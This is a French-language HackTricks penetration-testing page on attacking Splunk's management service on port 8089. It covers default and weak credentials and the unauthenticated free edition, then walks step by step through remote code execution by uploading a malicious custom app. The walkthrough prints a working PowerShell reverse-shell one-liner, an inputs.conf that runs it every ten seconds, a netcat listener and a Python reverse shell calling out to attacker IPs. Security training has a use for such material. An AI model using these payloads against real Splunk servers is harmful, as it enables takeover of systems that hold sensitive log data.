# 8089 - Test d'intrusion Splunkd

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informations de base**

Splunk est un **outil d'analyse de journaux** qui joue un r√¥le crucial dans la **collecte, l'analyse et la visualisation des donn√©es**. Bien que son objectif initial n'ait pas √©t√© de servir d'outil **SIEM (Gestion des informations et des √©v√©nements de s√©curit√©)**, il est devenu populaire dans le domaine de la **surveillance de la s√©curit√©** et de l'**analyse commerciale**.

Les d√©ploiements Splunk sont fr√©quemment utilis√©s pour stocker des **donn√©es sensibles** et peuvent servir de **source pr√©cieuse d'informations** pour les attaquants potentiels s'ils parviennent √† compromettre le syst√®me. **Port par d√©faut :** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
Le **serveur web Splunk fonctionne par d√©faut sur le port 8000**.
{% endhint %}

## √ânum√©ration

### Version gratuite

L'essai de Splunk Enterprise se convertit en **version gratuite apr√®s 60 jours**, qui **ne n√©cessite pas d'authentification**. Il n'est pas rare que les administrateurs syst√®me installent un essai de Splunk pour le tester, qui est **ensuite oubli√©**. Cela se convertira automatiquement en la version gratuite qui n'a aucune forme d'authentification, introduisant ainsi une faille de s√©curit√© dans l'environnement. Certaines organisations peuvent opter pour la version gratuite en raison de contraintes budg√©taires, sans comprendre pleinement les implications de l'absence de gestion des utilisateurs/r√¥les.

### Identifiants par d√©faut

Sur les anciennes versions de Splunk, les identifiants par d√©faut sont **`admin:changeme`**, qui sont affich√©s de mani√®re pratique sur la page de connexion.\
Cependant, **la derni√®re version de Splunk** d√©finit les **identifiants** **pendant le processus d'installation**. Si les identifiants par d√©faut ne fonctionnent pas, il vaut la peine de v√©rifier les mots de passe faibles courants tels que `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obtenir des informations

Une fois connect√© √† Splunk, nous pouvons **parcourir les donn√©es**, ex√©cuter des **rapports**, cr√©er des **tableaux de bord**, **installer des applications** √† partir de la biblioth√®que Splunkbase, et installer des applications personnalis√©es.\
Vous pouvez √©galement ex√©cuter du code : Splunk a plusieurs fa√ßons de **ex√©cuter du code**, comme des applications Django c√¥t√© serveur, des points de terminaison REST, des entr√©es script√©es et des scripts d'alerte. Une m√©thode courante pour obtenir une ex√©cution de code √† distance sur un serveur Splunk est l'utilisation d'une entr√©e script√©e.

De plus, comme Splunk peut √™tre install√© sur des h√¥tes Windows ou Linux, des entr√©es script√©es peuvent √™tre cr√©√©es pour ex√©cuter des scripts Bash, PowerShell ou Batch.

### Shodan

* `Construction Splunk`

## RCE

### Cr√©er une application personnalis√©e

Une application personnalis√©e peut ex√©cuter des **scripts Python, Batch, Bash ou PowerShell**.\
Notez que **Splunk est livr√© avec Python install√©**, donc m√™me sur les syst√®mes **Windows**, vous pourrez ex√©cuter du code python.

Vous pouvez utiliser [**ceci**](https://github.com/0xjpuff/reverse\_shell\_splunk) package Splunk pour nous aider. Le r√©pertoire **`bin`** de ce d√©p√¥t contient des exemples pour [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) et [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Suivons cela √©tape par √©tape.

Pour ce faire, nous devons d'abord cr√©er une application Splunk personnalis√©e en utilisant la structure de r√©pertoire suivante:
```shell-session
tree splunk_shell/

splunk_shell/
‚îú‚îÄ‚îÄ bin
‚îî‚îÄ‚îÄ default
```
Le r√©pertoire **`bin`** contiendra tous les **scripts que nous avons l'intention d'ex√©cuter** (dans ce cas, un shell invers√© **PowerShell**), et le r√©pertoire par d√©faut contiendra notre fichier `inputs.conf`. Notre shell invers√© sera un **PowerShell en une ligne :**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Le fichier [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) indique √† Splunk **quel script ex√©cuter** et toutes autres conditions. Ici, nous d√©finissons l'application comme activ√©e et indiquons √† Splunk d'ex√©cuter le script toutes les 10 secondes. L'intervalle est toujours en secondes, et l'entr√©e (script) ne s'ex√©cutera que si ce param√®tre est pr√©sent.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Nous avons besoin du fichier `.bat`, qui s'ex√©cutera lorsque l'application sera d√©ploy√©e et ex√©cutera la commande PowerShell en une ligne.

La prochaine √©tape consiste √† choisir `Installer l'application √† partir du fichier` et √† t√©l√©charger l'application.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Avant de t√©l√©charger l'application personnalis√©e malveillante, commen√ßons par d√©marrer un √©couteur en utilisant Netcat ou [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Sur la page `T√©l√©charger l'application`, cliquez sur parcourir, choisissez le fichier tar que nous avons cr√©√© pr√©c√©demment et cliquez sur `T√©l√©charger`. D√®s que nous t√©l√©chargeons l'application, un shell invers√© est re√ßu et le statut de l'application passe automatiquement √† `Activ√©`.

#### Linux

Si nous √©tions en train de travailler avec un h√¥te Linux, nous aurions besoin de modifier le script Python `rev.py` avant de cr√©er le fichier tar et de t√©l√©charger l'application malveillante personnalis√©e. Le reste du processus serait le m√™me, et nous obtiendrions une connexion de shell invers√© sur notre √©couteur Netcat pour commencer.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & √âl√©vation de privil√®ges

Sur la page suivante, vous pouvez trouver une explication sur la mani√®re dont ce service peut √™tre utilis√© de mani√®re abusive pour escalader les privil√®ges et obtenir de la persistance :

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
